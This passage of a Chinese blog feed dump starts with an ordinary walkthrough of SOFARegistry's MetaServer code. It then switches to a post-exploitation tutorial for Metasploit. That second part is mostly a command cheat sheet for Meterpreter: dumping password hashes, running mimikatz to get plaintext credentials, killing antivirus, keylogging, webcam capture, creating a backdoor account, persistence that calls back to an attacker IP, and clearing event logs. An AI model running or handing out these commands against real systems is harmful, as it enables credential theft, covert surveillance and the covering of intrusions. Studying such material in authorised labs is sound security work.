        int defaultPort = Container.DEFAULT_HTTP_PORT;
        final int port = (uri.getPort() == -1) ? defaultPort : uri.getPort();

        final org.eclipse.jetty.server.Server server = new org.eclipse.jetty.server.Server(
            new JettyConnectorThreadPool());

        final ServerConnector http = new ServerConnector(server, new HttpConnectionCustomFactory());
        http.setPort(port);
        server.setConnectors(new Connector[] { http });

        if (handler != null) {
            server.setHandler(handler);
        }

        if (start) {
            try {
                // Start the server.
                server.start();
            } 
        }
        return server;
    }  
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其堆栈如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;&amp;lt;init&amp;gt;:72, JerseyJettyServer (com.alipay.sofa.registry.remoting.jersey)
open:73, JerseyExchange (com.alipay.sofa.registry.remoting.jersey.exchange)
open:40, JerseyExchange (com.alipay.sofa.registry.remoting.jersey.exchange)
openHttpServer:205, MetaServerBootstrap (com.alipay.sofa.registry.server.meta.bootstrap)
start:114, MetaServerBootstrap (com.alipay.sofa.registry.server.meta.bootstrap)
start:51, MetaServerInitializerConfiguration (com.alipay.sofa.registry.server.meta.bootstrap)
doStart:173, DefaultLifecycleProcessor (org.springframework.context.support)
access$200:50, DefaultLifecycleProcessor (org.springframework.context.support)
start:350, DefaultLifecycleProcessor$LifecycleGroup (org.springframework.context.support)
startBeans:149, DefaultLifecycleProcessor (org.springframework.context.support)
onRefresh:112, DefaultLifecycleProcessor (org.springframework.context.support)
finishRefresh:880, AbstractApplicationContext (org.springframework.context.support)
refresh:546, AbstractApplicationContext (org.springframework.context.support)
refresh:693, SpringApplication (org.springframework.boot)
refreshContext:360, SpringApplication (org.springframework.boot)
run:303, SpringApplication (org.springframework.boot)
run:1118, SpringApplication (org.springframework.boot)
run:1107, SpringApplication (org.springframework.boot)
main:42, MetaApplication (com.alipay.sofa.registry.server.meta)
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;6413-raftservice&quot;&gt;6.4.1.3 @RaftService&lt;/h4&gt;
&lt;p&gt;如下存储由Raft来保证数据一致性，后文针对此有详细讲解。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@RaftService(uniqueId = &quot;sessionServer&quot;)
public class SessionVersionRepositoryService 
  
@RaftService(uniqueId = &quot;metaServer&quot;)
public class MetaRepositoryService  
  
@RaftService(uniqueId = &quot;dataServer&quot;)
public class DataRepositoryService  
  
@RaftService(uniqueId = &quot;sessionServer&quot;)
public class SessionRepositoryService   
  
@RaftService(uniqueId = &quot;dataServer&quot;)
public class DataConfirmStatusService   
  
@RaftService(uniqueId = &quot;sessionServer&quot;)
public class SessionConfirmStatusService  
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;642-executormanager&quot;&gt;6.4.2 ExecutorManager&lt;/h3&gt;
&lt;p&gt;是一个启动各种管理线程的地方，都是定期常规管理任务。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class ExecutorManager {

    private ScheduledExecutorService scheduler;

    private ThreadPoolExecutor       heartbeatCheckExecutor;
    private ThreadPoolExecutor       checkDataChangeExecutor;
    private ThreadPoolExecutor       getOtherDataCenterChangeExecutor;
    private ThreadPoolExecutor       connectMetaServerExecutor;
    private ThreadPoolExecutor       checkNodeListChangePushExecutor;
    private ThreadPoolExecutor       raftClientRefreshExecutor;

    private MetaServerConfig         metaServerConfig;

    @Autowired
    private Registry                 metaServerRegistry;

    @Autowired
    private MetaClientExchanger      metaClientExchanger;

    @Autowired
    private RaftExchanger            raftExchanger;
  
   public void startScheduler() {

        init();

        scheduler.schedule(new TimedSupervisorTask(&quot;HeartbeatCheck&quot;, scheduler, heartbeatCheckExecutor,
                        metaServerConfig.getSchedulerHeartbeatTimeout(), TimeUnit.SECONDS,
                        metaServerConfig.getSchedulerHeartbeatExpBackOffBound(), () -&amp;gt; metaServerRegistry.evict()),
                metaServerConfig.getSchedulerHeartbeatFirstDelay(), TimeUnit.SECONDS);

        scheduler.schedule(
                new TimedSupervisorTask(&quot;GetOtherDataCenterChange&quot;, scheduler, getOtherDataCenterChangeExecutor,
                        metaServerConfig.getSchedulerGetDataChangeTimeout(), TimeUnit.SECONDS,
                        metaServerConfig.getSchedulerGetDataChangeExpBackOffBound(), () -&amp;gt; {
                    metaServerRegistry.getOtherDataCenterNodeAndUpdate(NodeType.DATA);
                    metaServerRegistry.getOtherDataCenterNodeAndUpdate(NodeType.META);
                }), metaServerConfig.getSchedulerGetDataChangeFirstDelay(), TimeUnit.SECONDS);

        scheduler.schedule(new TimedSupervisorTask(&quot;ConnectMetaServer&quot;, scheduler, connectMetaServerExecutor,
                        metaServerConfig.getSchedulerConnectMetaServerTimeout(), TimeUnit.SECONDS,
                        metaServerConfig.getSchedulerConnectMetaServerExpBackOffBound(),
                        () -&amp;gt; metaClientExchanger.connectServer()), metaServerConfig.getSchedulerConnectMetaServerFirstDelay(),
                TimeUnit.SECONDS);

        scheduler.schedule(
                new TimedSupervisorTask(&quot;CheckSessionNodeListChangePush&quot;, scheduler, checkNodeListChangePushExecutor,
                        metaServerConfig.getSchedulerCheckNodeListChangePushTimeout(), TimeUnit.SECONDS,
                        metaServerConfig.getSchedulerCheckNodeListChangePushExpBackOffBound(),
                        () -&amp;gt; metaServerRegistry.pushNodeListChange(NodeType.SESSION)),
                metaServerConfig.getSchedulerCheckNodeListChangePushFirstDelay(), TimeUnit.SECONDS);

        scheduler.schedule(
                new TimedSupervisorTask(&quot;CheckDataNodeListChangePush&quot;, scheduler, checkNodeListChangePushExecutor,
                        metaServerConfig.getSchedulerCheckNodeListChangePushTimeout(), TimeUnit.SECONDS,
                        metaServerConfig.getSchedulerCheckNodeListChangePushExpBackOffBound(),
                        () -&amp;gt; metaServerRegistry.pushNodeListChange(NodeType.DATA)),
                metaServerConfig.getSchedulerCheckNodeListChangePushFirstDelay(), TimeUnit.SECONDS);

        scheduler.schedule(new TimedSupervisorTask(&quot;RaftClientRefresh&quot;, scheduler, raftClientRefreshExecutor,
                        metaServerConfig.getSchedulerCheckNodeListChangePushTimeout(), TimeUnit.SECONDS,
                        metaServerConfig.getSchedulerCheckNodeListChangePushExpBackOffBound(),
                        () -&amp;gt; raftExchanger.refreshRaftClient()),
                metaServerConfig.getSchedulerCheckNodeListChangePushFirstDelay(), TimeUnit.SECONDS);

    }  
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;6421-启动&quot;&gt;6.4.2.1 启动&lt;/h4&gt;
&lt;p&gt;ExecutorManager 的启动设置是在 MetaServerBootstrap.initRaft 之中，分别启动RaftServer，RaftClient，CliService。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void initRaft() {
    raftExchanger.startRaftServer(executorManager);
    raftExchanger.startRaftClient();
    raftExchanger.startCliService();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当 Raft 选出 Leader 之后，会调用到 ExecutorManager # startScheduler。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;首先生成各个ThreadPoolExecutor；&lt;/li&gt;
&lt;li&gt;然后运行本身的 各个TimedSupervisorTask，其会调用不同的handler，比如 connectServer，getSchedulerHeartbeatFirstDelay 等等；&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;6422-timedsupervisortask&quot;&gt;6.4.2.2 TimedSupervisorTask&lt;/h4&gt;
&lt;p&gt;TimedSupervisorTask 实现了 TimerTask。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class TimedSupervisorTask extends TimerTask {
    private final ScheduledExecutorService scheduler;
    private final ThreadPoolExecutor       executor;
    private final long                     timeoutMillis;
    private final Runnable                 task;
    private String                         name;
    private final AtomicLong               delay;
    private final long                     maxDelay;

    @Override
    public void run() {
        Future future = null;
        try {
            future = executor.submit(task);
            // block until done or timeout
            future.get(timeoutMillis, TimeUnit.MILLISECONDS);
            delay.set(timeoutMillis);
        } catch {
                                                .....
        } finally {
            if (future != null) {
                future.cancel(true);
            }
            scheduler.schedule(this, delay.get(), TimeUnit.MILLISECONDS);
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;6423-管理任务&quot;&gt;6.4.2.3 管理任务&lt;/h4&gt;
&lt;p&gt;可以看到管理任务大致有：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;HeartbeatCheck ：心跳检测；&lt;/li&gt;
&lt;li&gt;GetOtherDataCenterChange ：查看其他数据中心的变化；&lt;/li&gt;
&lt;li&gt;ConnectMetaServer ：与其他的MetaServer交互；&lt;/li&gt;
&lt;li&gt;CheckSessionNodeListChangePush ：看看Session节点的变化；&lt;/li&gt;
&lt;li&gt;CheckDataNodeListChangePush ：查看数据节点变化；&lt;/li&gt;
&lt;li&gt;RaftClientRefresh ：看看Raft 服务消息；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;TimedSupervisorTask 会定期执行，比如 CheckDataNodeListChangePush 这个线程会定期执行 metaServerRegistry.pushNodeListChange(NodeType.DATA)) 来看看是否有变化。这里就会用到DataNode注册时候，Confirm的消息。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Override
public void pushNodeListChange() {
    NodeOperator&amp;lt;DataNode&amp;gt; fireNode;
    if ((fireNode = dataConfirmStatusService.peekConfirmNode()) != null) {
        NodeChangeResult nodeChangeResult = getNodeChangeResult();
        Map&amp;lt;String, Map&amp;lt;String, DataNode&amp;gt;&amp;gt; map = nodeChangeResult.getNodes();
        Map&amp;lt;String, DataNode&amp;gt; addNodes = map.get(nodeConfig.getLocalDataCenter());
        if (addNodes != null) {
            Map&amp;lt;String, DataNode&amp;gt; previousNodes = dataConfirmStatusService.putExpectNodes(
                fireNode.getNode(), addNodes);
            if (!previousNodes.isEmpty()) {
                firePushDataListTask(fireNode, nodeChangeResult, previousNodes, true);
            }
        }
        firePushSessionListTask(nodeChangeResult, fireNode.getNodeOperate().toString());
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;再比如定期去除过期的Node：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class MetaServerRegistry implements Registry&amp;lt;Node&amp;gt; {
    @Override
    public void evict() {
        for (NodeType nodeType : NodeType.values()) {
            StoreService storeService = ServiceFactory.getStoreService(nodeType);
            if (storeService != null) {
                Collection&amp;lt;Node&amp;gt; expiredNodes = storeService.getExpired();
                if (expiredNodes != null &amp;amp;&amp;amp; !expiredNodes.isEmpty()) {
                    storeService.removeNodes(expiredNodes);
                }
            }
        }
    }  
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;643-servicefactory&quot;&gt;6.4.3 ServiceFactory&lt;/h3&gt;
&lt;p&gt;ServiceFactory 需要特殊说明，它提供了系统所需要的一系列服务。特殊之处在于，ServiceFactory 不是由 MetaServerBootstrap 负责启动，而是由 Spring 负责启动。&lt;u&gt;因为 ServiceFactory 继承了ApplicationContextAware，所以启动时候生成&lt;/u&gt;。&lt;/p&gt;
&lt;p&gt;在Web应用中，Spring容器通常采用声明式方式配置产生：开发者只要在web.xml中配置一个Listener，该Listener将会负责初始化Spring容器，MVC框架可以直接调用Spring容器中的Bean，无需访问Spring容器本身。在这种情况下，容器中的Bean处于容器管理下，无需主动访问容器，只需接受容器的依赖注入即可。&lt;/p&gt;
&lt;p&gt;但在某些特殊的情况下，Bean需要实现某个功能，但该功能必须借助于Spring容器才能实现，此时就必须让该Bean先获取Spring容器，然后借助于Spring容器实现该功能。为了让Bean获取它所在的Spring容器，可以让该Bean实现ApplicationContextAware接口。&lt;/p&gt;
&lt;p&gt;下面代码可以看出来，启动了一系列服务。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class ServiceFactory implements ApplicationContextAware {
    private static Map&amp;lt;NodeType, StoreService&amp;gt;       storeServiceMap   = new HashMap&amp;lt;&amp;gt;();
    private static Map&amp;lt;NodeType, NodeConnectManager&amp;gt; connectManagerMap = new HashMap&amp;lt;&amp;gt;();
    private static Map&amp;lt;NodeType, NodeService&amp;gt;        nodeServiceMap    = new HashMap&amp;lt;&amp;gt;();  
}

storeServiceMap = {HashMap@5107}  size = 3
 {Node$NodeType@5525} &quot;SESSION&quot; -&amp;gt; {SessionStoreService@5526} 
  key = {Node$NodeType@5525} &quot;SESSION&quot;
  value = {SessionStoreService@5526} 
 {Node$NodeType@4815} &quot;DATA&quot; -&amp;gt; {DataStoreService@5527} 
  key = {Node$NodeType@4815} &quot;DATA&quot;
  value = {DataStoreService@5527} 
 {Node$NodeType@5528} &quot;META&quot; -&amp;gt; {MetaStoreService@5529} 
  key = {Node$NodeType@5528} &quot;META&quot;
  value = {MetaStoreService@5529} 

connectManagerMap = {HashMap@5532}  size = 3
 {Node$NodeType@5525} &quot;SESSION&quot; -&amp;gt; {SessionConnectionHandler@5548} 
  key = {Node$NodeType@5525} &quot;SESSION&quot;
  value = {SessionConnectionHandler@5548} 
 {Node$NodeType@4815} &quot;DATA&quot; -&amp;gt; {DataConnectionHandler@5549} 
  key = {Node$NodeType@4815} &quot;DATA&quot;
  value = {DataConnectionHandler@5549} 
 {Node$NodeType@5528} &quot;META&quot; -&amp;gt; {MetaConnectionHandler@5550} 
  key = {Node$NodeType@5528} &quot;META&quot;
  value = {MetaConnectionHandler@5550} 

nodeServiceMap = {HashMap@5533}  size = 3
 {Node$NodeType@5525} &quot;SESSION&quot; -&amp;gt; {SessionNodeServiceImpl@5540} 
  key = {Node$NodeType@5525} &quot;SESSION&quot;
  value = {SessionNodeServiceImpl@5540} 
 {Node$NodeType@4815} &quot;DATA&quot; -&amp;gt; {DataNodeServiceImpl@5541} 
  key = {Node$NodeType@4815} &quot;DATA&quot;
  value = {DataNodeServiceImpl@5541} 
 {Node$NodeType@5528} &quot;META&quot; -&amp;gt; {MetaNodeServiceImpl@5542} 
  key = {Node$NodeType@5528} &quot;META&quot;
  value = {MetaNodeServiceImpl@5542} 

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;至此，MetaServer的架构和启动介绍完成，我们下文将会介绍基本功能，比如注册，存储，续约等。&lt;/p&gt;
&lt;h2 id=&quot;0xff-参考&quot;&gt;0xFF 参考&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sofastack.tech/blog/sofa-registry-metaserver-function-introduction/&quot;&gt;服务注册中心 MetaServer 功能介绍和实现剖析 | SOFARegistry 解析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sofastack.tech/blog/sofa-registry-dataserver-smooth-expansion-contraction/&quot;&gt;服务注册中心如何实现 DataServer 平滑扩缩容 | SOFARegistry 解析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sofastack.tech/blog/sofa-registry-data-consistency/&quot;&gt;服务注册中心数据一致性方案分析 | SOFARegistry 解析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sofastack.tech/blog/sofa-registry-service-offline-notification/&quot;&gt;服务注册中心如何实现秒级服务上下线通知 | SOFARegistry 解析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sofastack.tech/blog/sofa-registry-session-storage/&quot;&gt;服务注册中心 Session 存储策略 | SOFARegistry 解析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sofastack.tech/blog/sofa-registry-data-fragmentation-synchronization-scheme/&quot;&gt;服务注册中心数据分片和同步方案详解 | SOFARegistry 解析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sofastack.tech/blog/sofa-registry-service-discovery-optimization/&quot;&gt;服务注册中心 SOFARegistry 解析 | 服务发现优化之路&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sofastack.tech/blog/sofa-registry-introduction/&quot;&gt;海量数据下的注册中心 - SOFARegistry 架构介绍&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sofastack.tech/projects/sofa-registry/server-quick-start/&quot;&gt;服务端部署&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sofastack.tech/projects/sofa-registry/client-quick-start/&quot;&gt;客户端使用&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/125573685&quot;&gt;全面理解Raft协议&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/ff00yo/article/details/89212859&quot;&gt;详解蚂蚁金服 SOFAJRaft | 生产级高性能 Java 实现&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/luozhiyun/p/13150808.html&quot;&gt;从JRaft来看Raft协议实现细节&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/luozhiyun/p/11627092.html&quot;&gt;SOFAJRaft—初次使用&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.bookstack.cn/read/sofa-jraft/3.md&quot;&gt;JRaft 用户指南 &amp;amp; API 详解&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/bonelee/p/6228998.html&quot;&gt;怎样打造一个分布式数据库——rocksDB, raft, mvcc，本质上是为了解决跨数据中心的复制&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.bubuko.com/infodetail-3451565.html&quot;&gt;sofa-bolt源码阅读(5)-日志&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/mindwind/p/5231986.html&quot;&gt;Raft 为什么是更易理解的分布式一致性算法&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://segmentfault.com/a/1190000022397988&quot;&gt;SOFAJRaft 源码分析一（启动流程和节点变化）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sofastack.tech/blog/sofa-jraft-algorithm-storage-module-deep-dive/&quot;&gt;SOFAJRaft 实现原理 - 生产级 Raft 算法库存储模块剖析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sofastack.tech/projects/sofa-registry/client-quick-start/&quot;&gt;客户端使用&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Thu, 08 Oct 2020 13:41:00 +0000</pubDate>
<dc:creator>罗西的思考</dc:creator>
<og:description>SOFARegistry 是蚂蚁金服开源的一个生产级、高时效、高可用的服务注册中心。本系列将带领大家一起分析其MetaServer的实现机制，本文为第一篇，介绍MetaServer总体架构。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/rossiXYZ/p/13782794.html</dc:identifier>
</item>
<item>
<title>Metasploit简单使用——后渗透阶段 - 戚源</title>
<link>http://www.cnblogs.com/qi-yuan/p/13782842.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/qi-yuan/p/13782842.html</guid>
<description>&lt;p&gt;&lt;strong&gt;在上文中我们复现了永恒之蓝漏洞，这里我们学习一下利用msf简单的后渗透阶段的知识/&lt;/strong&gt;&lt;/p&gt;

&lt;h2&gt;&lt;strong&gt;一、meterperter常用命令&lt;/strong&gt;&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;sysinfo             #查看目标主机系统信息
run scraper         #查看目标主机详细信息
run hashdump        #导出密码的哈希
load kiwi           #加载mimikatz
ps                  #查看目标主机进程信息
pwd                 #查看目标当前目录(windows)
getlwd              #查看目标当前目录(Linux)
search -f *.jsp -&lt;span&gt;d e:\                #搜索E盘中所有以.jsp为后缀的文件
download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/&lt;span&gt;root目录下
upload    /root/test.txt d:\test      #将/root/&lt;span&gt;test.txt上传到目标机的 d:\test\ 目录下
getpid              #查看当前Meterpreter Shell的进程PID
migrate 1384&lt;span&gt;        #将当前Meterpreter Shell的进程迁移到PID为1384的进程上
idletime            #查看主机运行时间
getuid              #查看获取的当前权限
getsystem           #提权
run killav/run post/windows/manage/killav         #关闭杀毒软件
screenshot          #截图
webcam_list         #查看目标主机的摄像头
webcam_snap         #拍照
webcam_stream       #开视频
execute  参数  -&lt;span&gt;f 可执行文件   #执行可执行程序
run getgui -u hack -p 123&lt;span&gt;    #创建hack用户，密码为123
run getgui -&lt;span&gt;e                #开启远程桌面
keyscan_start                #开启键盘记录功能
keyscan_dump                 #显示捕捉到的键盘记录信息
keyscan_stop                 #停止键盘记录功能
uictl  disable  keyboard     #禁止目标使用键盘
uictl  enable   keyboard     #允许目标使用键盘
uictl  disable  mouse        #禁止目标使用鼠标
uictl  enable   mouse        #允许目标使用鼠标
load                         #使用扩展库
run                     #使用扩展库
 
run persistence -X -i 5 -p 8888 -r 192.168.1.114        #反弹时间间隔是5s 会自动连接192.168&lt;span&gt;.1.114的4444端口，缺点是容易被杀毒软件查杀
portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11&lt;span&gt;.13是获取权限的主机的ip地址
clearev                       #清除日志&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt; 二、Post 后渗透模块&lt;/h2&gt;
&lt;p&gt;该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
run post/windows/manage/&lt;span&gt;migrate           #自动进程迁移
run post&lt;/span&gt;/windows/gather/&lt;span&gt;checkvm           #查看目标主机是否运行在虚拟机上
run post&lt;/span&gt;/windows/manage/&lt;span&gt;killav            #关闭杀毒软件
run post&lt;/span&gt;/windows/manage/&lt;span&gt;enable_rdp        #开启远程桌面服务
run post&lt;/span&gt;/windows/manage/&lt;span&gt;autoroute         #查看路由信息
run post&lt;/span&gt;/windows/gather/&lt;span&gt;enum_logged_on_users    #列举当前登录的用户
run post&lt;/span&gt;/windows/gather/&lt;span&gt;enum_applications       #列举应用程序
run windows&lt;/span&gt;/gather/credentials/&lt;span&gt;windows_autologin #抓取自动登录的用户名和密码
run windows&lt;/span&gt;/gather/smart_hashdump               #dump出所有用户的hash
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;三、常用的命令&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;访问文件系统&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Meterpreter支持非常多的文件系统命令（基本跟Linux系统命令类似），一些常用命令如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;cd：切换目标目录；

cat：读取文件内容；

rm：删除文件；

edit：使用vim编辑文件

ls：获取当前目录下的文件；

mkdir：新建目录；

rmdir：删除目录； &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;上传/下载文件&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;download  file 命令可以帮助我们从目标系统中下载文件

upload  file  命令则能够向目标系统上传文件。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;权限提升&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个&lt;strong&gt;&lt;span class=&quot;Apple-converted-space&quot;&gt; &lt;/span&gt;&lt;/strong&gt;getsystem&lt;span class=&quot;Apple-converted-space&quot;&gt; 命令，它可以使用多种技术在目标系统中实现提权：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;getuid&lt;/strong&gt; &lt;span class=&quot;Apple-converted-space&quot;&gt; 命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为  NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注：&lt;/strong&gt;执行getsystem命令后，会显示错误，但是其实已经运行成功了！&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;获取密码(管理员权限)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1. run hashdump&lt;/p&gt;
&lt;p&gt;2. run windows/gather/smart_hashdump&lt;/p&gt;
&lt;p&gt;3. 自己上传mimikatz&lt;/p&gt;
&lt;p&gt;4. load kiwi——creds all&lt;/p&gt;
&lt;p&gt;5. load mimikatz：①32位系统直接加载模块 mimikatz_command -f sekurlsa::searchPasswords&lt;/p&gt;
&lt;p&gt;                              ②64位系统先迁移meterpreter到64位的进程中，再加载模块&lt;/p&gt;
&lt;p&gt;1、很多用户习惯将计算机设置自动登录，可以使用  &lt;span&gt;&lt;code&gt;run windows/gather/credentials/windows_autologin&lt;/code&gt;&lt;/span&gt; 抓取自动登录的用户名和密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008154446668-306111933.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt; 2、hashdump 模块可以从SAM数据库中导出本地用户账号，执行：run hashdump&lt;span class=&quot;Apple-converted-space&quot;&gt; ，该命令的使用需要&lt;strong&gt;系统权限&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008154541997-102292758.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt; 还可以使用命令：run windows/gather/smart_hashdump &lt;span class=&quot;Apple-converted-space&quot;&gt; ，，该命令的使用需要&lt;strong&gt;系统权限，&lt;/strong&gt;该功能更强大，可以导出域内所有用户的hash&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008154650433-87421825.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt; 3、我们还可以通过上传mimikatz程序，然后执行mimikatz程序来获取明文密码。&lt;/p&gt;
&lt;p&gt; 执行mimikatz必须&lt;strong&gt;System权限&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt; 我们先getsystem提权至系统权限，然后执行 &lt;span class=&quot;Apple-converted-space&quot;&gt; execute  -i  -f  mimikatz.exe&lt;span class=&quot;Apple-converted-space&quot;&gt; ，进入mimikatz的交互界面。然后执行：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;privilege::debug

sekurlsa::logonpasswords&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;4、加载kiwi模块，该模块的使用需要&lt;strong&gt;System权限&lt;/strong&gt;，load kiwi &lt;span class=&quot;Apple-converted-space&quot;&gt; 查看该kiwi模块的用法：help kiwi&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008163319575-2064209033.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;5、或者运行MSF里面自带的 mimikatz 模块 ，该模块的使用需要&lt;strong&gt;System权限&lt;/strong&gt;。传送门：MSF中mimikatz模块的使用&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;运行程序&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用 &lt;span class=&quot;Apple-converted-space&quot;&gt; execute&lt;span class=&quot;Apple-converted-space&quot;&gt; 命令在目标系统中执行应用程序。这个命令的使用方法如下：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
execute  参数  -f 可执行文件  
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;运行后它将执行所指定的命令。可选参数如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
-&lt;span&gt;f：指定可执行文件

&lt;/span&gt;-&lt;span&gt;H：创建一个隐藏进程

&lt;/span&gt;-&lt;span&gt;a：传递给命令的参数

&lt;/span&gt;-&lt;span&gt;i：  跟进程进行交互

&lt;/span&gt;-&lt;span&gt;m：从内存中执行

&lt;/span&gt;-&lt;span&gt;t： 使用当前伪造的线程令牌运行进程

&lt;/span&gt;-s： 在给定会话中执行进程
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;创建一个新账号&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;先查看目标主机有哪些用户：run post/windows/gather/enum_logged_on_users&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1838411/202010/1838411-20201008163924920-276772455.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

